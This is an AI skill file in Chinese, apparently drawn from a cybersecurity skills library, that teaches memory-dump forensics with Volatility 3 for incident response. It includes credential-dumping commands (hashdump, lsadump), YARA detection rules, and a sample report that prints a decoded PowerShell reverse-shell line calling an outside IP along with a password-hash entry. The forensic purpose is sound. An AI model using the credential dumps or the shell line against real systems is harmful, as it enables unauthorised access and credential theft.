---
name: cszh-analyzing-memory-dumps-with-volatility
description: 使用 Volatility 框架分析被攻陷系统的 RAM 内存转储，以识别恶意进程、注入代码、 网络连接、加载模块和提取凭据。
---

> 本技能源自中文网络安全技能库 killvxk/cybersecurity-skills-zh（上游目录 analyzing-memory-dumps-with-volatility），正文按中文原文照录。

**这个技能干什么**：使用 Volatility 框架分析被攻陷系统的 RAM 内存转储，以识别恶意进程、注入代码、 网络连接、加载模块和提取凭据。

**什么时候用**：需要按上游中文方法论执行「analyzing-memory-dumps-with-volatility」对应任务时加载本技能。

**关键工具**：见正文各章节列出的命令与工具清单。

# 使用 Volatility 分析内存转储

## 适用场景

- 被攻陷系统的 RAM 已被捕获，需要对恶意软件工件进行取证分析
- 检测仅存在于内存中、没有持久化磁盘工件的无文件恶意软件
- 从进程内存中提取加密密钥、密码或解密后的配置
- 识别被攻陷系统中的进程注入、DLL 注入或进程空洞化
- 分析隐藏在标准磁盘取证工具之外的 Rootkit 活动

**不适用于**磁盘镜像分析；请使用 Autopsy、FTK 或 Sleuth Kit 进行磁盘取证。

## 前置条件

- Volatility 3 已安装（`pip install volatility3`），并带有目标操作系统的符号表
- 从目标系统获取的内存转储文件（使用 WinPmem、LiME 或 DumpIt）
- 了解源操作系统版本，用于正确选择配置文件/符号
- 足够的磁盘空间（内存转储可达 4-64 GB）
- 用于扫描内存中已知恶意软件签名的 YARA 规则
- Strings 工具，用于从内存区域提取可读字符串

## 工作流程

### 步骤 1：识别内存转储配置文件

从内存转储中确定操作系统和版本：

```bash
# Volatility 3：自动操作系统检测
vol3 -f memory.dmp windows.info

# 列出可用插件
vol3 -f memory.dmp --help

# 如果需要符号表，从以下地址下载：
# https://downloads.volatilityfoundation.org/volatility3/symbols/

# 对于 Volatility 2（旧版）：
vol2 -f memory.dmp imageinfo
vol2 -f memory.dmp kdbgscan
```

### 步骤 2：枚举运行中的进程

列出所有进程并识别可疑条目：

```bash
# 列出所有进程
vol3 -f memory.dmp windows.pslist

# 进程树（父子进程关系）
vol3 -f memory.dmp windows.pstree

# 扫描隐藏/未链接的进程（Rootkit 检测）
vol3 -f memory.dmp windows.psscan

# 比较 pslist 和 psscan 以查找隐藏进程
# 在 psscan 中但不在 pslist 中的进程可能被 Rootkit 隐藏

# 检查进程空洞化
vol3 -f memory.dmp windows.pslist --dump
# 然后验证转储的 EXE 是否与磁盘上的预期二进制文件匹配
```

```
可疑进程指标：
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- svchost.exe 不是由 services.exe 启动（父进程错误）
- csrss.exe/lsass.exe 具有异常的父进程
- lsass.exe 有多个实例（应该只有一个）
- 进程名称拼写错误（scvhost.exe、lssas.exe）
- cmd.exe 或 powershell.exe 由 WINWORD.EXE 或浏览器启动
- 从异常路径运行的进程（%TEMP%、%APPDATA%）
- 没有父进程的进程（孤立进程 - 父进程已终止）
```

### 步骤 3：检测恶意代码注入

扫描注入的代码和进程空洞化：

```bash
# 检测进程中的注入代码（malfind）
vol3 -f memory.dmp windows.malfind

# malfind 查找：
# - 具有 PAGE_EXECUTE_READWRITE 保护的内存区域
# - 包含 PE 头部（MZ/PE 签名）的内存区域
# - VAD（虚拟地址描述符）异常

# 转储注入的内存区域进行分析
vol3 -f memory.dmp windows.malfind --dump --pid 2184

# 列出每个进程加载的 DLL
vol3 -f memory.dmp windows.dlllist --pid 2184

# 通过比较映射镜像与磁盘检测空洞化进程
vol3 -f memory.dmp windows.hollowfind

# 扫描加载的驱动程序（潜在的 Rootkit 驱动程序）
vol3 -f memory.dmp windows.driverscan

# 列出内核模块
vol3 -f memory.dmp windows.modules
```

### 步骤 4：分析网络连接

提取活动和已关闭的网络连接：

```bash
# 列出所有网络连接（活动和监听）
vol3 -f memory.dmp windows.netscan

# 输出列：偏移量、协议、本地地址、本地端口、外部地址、外部端口、状态、PID、所有者

# 过滤到外部 IP 的已建立连接
vol3 -f memory.dmp windows.netscan | grep ESTABLISHED

# 对于旧版 Windows（XP/2003）：
vol3 -f memory.dmp windows.netstat

# 将 PID 与进程列表交叉验证
# 可疑：svchost.exe 通过非标准端口连接到外部 IP
# 可疑：notepad.exe 或 calc.exe 有网络连接
```

### 步骤 5：提取工件和凭据

从内存中恢复敏感数据：

```bash
# 转储特定 PID 的进程内存
vol3 -f memory.dmp windows.memmap --dump --pid 2184

# 提取命令行历史
vol3 -f memory.dmp windows.cmdline

# 提取环境变量
vol3 -f memory.dmp windows.envars --pid 2184

# 注册表分析（提取 Run 键用于持久化）
vol3 -f memory.dmp windows.registry.printkey \
  --key "Software\Microsoft\Windows\CurrentVersion\Run"

# 提取哈希/缓存的凭据
vol3 -f memory.dmp windows.hashdump
vol3 -f memory.dmp windows.cachedump
vol3 -f memory.dmp windows.lsadump

# 提取剪贴板内容
vol3 -f memory.dmp windows.clipboard

# 从内存提取文件
vol3 -f memory.dmp windows.filescan | grep -i "payload\|malware\|suspicious"
vol3 -f memory.dmp windows.dumpfiles --virtaddr 0xFA8001234560
```

### 步骤 6：使用 YARA 规则扫描内存

应用 YARA 签名检测内存中的已知恶意软件：

```bash
# 使用 YARA 规则扫描整个内存转储
vol3 -f memory.dmp yarascan.YaraScan --yara-file malware_rules.yar

# 扫描特定进程内存
vol3 -f memory.dmp yarascan.YaraScan --yara-file malware_rules.yar --pid 2184

# 使用常见模式的内置 YARA 扫描
vol3 -f memory.dmp yarascan.YaraScan --yara-rules "rule FindC2 { strings: \$s1 = \"gate.php\" condition: \$s1 }"

# 扫描加密密钥材料
vol3 -f memory.dmp yarascan.YaraScan --yara-rules "rule AES_Key { strings: \$sbox = { 63 7C 77 7B F2 6B 6F C5 } condition: \$sbox }"
```

### 步骤 7：时间线和报告生成

创建分析时间线并汇编发现结果：

```bash
# 生成全面的时间线
vol3 -f memory.dmp timeliner.Timeliner --output-file timeline.csv

# 时间线包含：
# - 进程创建/退出时间
# - 网络连接时间戳
# - 注册表修改时间
# - 文件访问时间

# 导出进程列表用于报告
vol3 -f memory.dmp windows.pslist --output csv > processes.csv

# 导出网络连接
vol3 -f memory.dmp windows.netscan --output csv > network.csv
```

## 核心概念

| 术语 | 定义 |
|------|------------|
| **内存取证** | 分析易失性内存（RAM）内容，以识别运行中的进程、网络连接和可能不存在于磁盘上的内存工件 |
| **进程空洞化** | 恶意软件技术，以挂起状态创建合法进程，用恶意代码替换其内存，然后恢复执行 |
| **Malfind** | Volatility 插件，通过识别非镜像 VAD 中具有可执行权限和 PE 头部的内存区域来检测注入代码 |
| **VAD（虚拟地址描述符）** | Windows 内核结构，跟踪分配给进程的内存区域；VAD 中的异常表明注入或空洞化 |
| **EPROCESS** | 表示进程的 Windows 内核结构；Rootkit 通过取消链接 EPROCESS 条目来向标准工具隐藏进程 |
| **池标签扫描** | 内存取证技术，扫描内核对象池标签以查找对象（进程、文件、连接），即使在未链接时也能找到 |
| **无文件恶意软件** | 完全在内存中运行而不在磁盘上创建文件的恶意软件；只能通过内存取证检测 |

## 工具与系统

- **Volatility 3**：开源内存取证框架，支持 Windows、Linux 和 macOS 内存分析，具有插件架构
- **WinPmem**：Windows 系统的内存获取工具，创建原始内存转储用于离线分析
- **LiME（Linux 内存提取器）**：用于捕获 Linux 系统内存转储的可加载内核模块
- **Rekall**：具有一些独特分析能力的替代内存取证框架（已停止维护但仍有用）
- **MemProcFS**：内存进程文件系统，允许将内存转储挂载为文件系统进行直观分析

## 常见场景

### 场景：在 EDR 告警后检测无文件恶意软件

**场景背景**：EDR 检测到可疑的 PowerShell 活动，但威胁者清除了磁盘工件。系统重启前已捕获内存转储。分析需要识别恶意软件、其持久化机制和任何横向移动。

**方法**：
1. 运行 `windows.pstree` 识别进程链（哪个进程启动了 PowerShell）
2. 运行 `windows.malfind` 检测运行中进程中的注入代码
3. 转储可疑进程内存并提取字符串以获取 C2 URL
4. 运行 `windows.netscan` 识别被攻陷进程的网络连接
5. 运行 `windows.cmdline` 查看 PowerShell 执行了什么命令
6. 使用 YARA 规则对转储的进程内存扫描已知恶意软件家族
7. 使用 `hashdump` 和 `lsadump` 提取凭据以评估横向移动风险

**常见陷阱**：
- 使用错误的操作系统版本符号表（导致插件失败或结果不正确）
- 不比较 `pslist` 和 `psscan` 输出（遗漏 Rootkit 隐藏的进程）
- 忽略被注入的合法进程（关注 malfind 结果，而不仅仅是进程名称）
- 在得出结论前未提取完整进程内存（进程转储中的字符串可能揭示额外的 IOC）

## 输出格式

```
内存取证分析报告
===================================
转储文件：       memory.dmp
转储大小：       16 GB
操作系统版本：   Windows 10 21H2（内部版本 19044）
捕获工具：       WinPmem 4.0
捕获时间：       2025-09-15 14:35:00 UTC

可疑进程
PID   PPID  名称              路径                                    异常
2184  1052  svchost.exe       C:\Users\Admin\AppData\Temp\svchost.exe 路径错误
4012  2184  powershell.exe    C:\Windows\System32\powershell.exe      伪造 svchost 的子进程
3456  4012  cmd.exe           C:\Windows\System32\cmd.exe             由 PowerShell 启动

检测到代码注入（malfind）
PID 852（explorer.exe）：
  地址：0x00400000  大小：98304  保护：PAGE_EXECUTE_READWRITE
  头部：MZ（检测到嵌入的 PE）
  转储 SHA-256：abc123def456...

网络连接
PID   进程            本地              外部                  状态
2184  svchost.exe     10.1.5.42:49152   185.220.101.42:443    ESTABLISHED
4012  powershell.exe  10.1.5.42:49200   91.215.85.17:8080     ESTABLISHED

提取的凭据
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

命令行历史
PID 4012：powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==
  解码：$client = New-Object System.Net.Sockets.TCPClient("185.220.101.42",443)

YARA 匹配
PID 2184：rule CobaltStrike_Beacon { matched at 0x00401200 }

时间线
14:10:00  svchost.exe（PID 2184）从 C:\Users\Admin\AppData\Temp\ 创建
14:10:05  建立到 185.220.101.42:443 的网络连接
14:12:30  powershell.exe（PID 4012）由 svchost.exe 启动
14:15:00  检测到对 explorer.exe（PID 852）的代码注入
14:20:00  从 LSASS 进程转储凭据
```
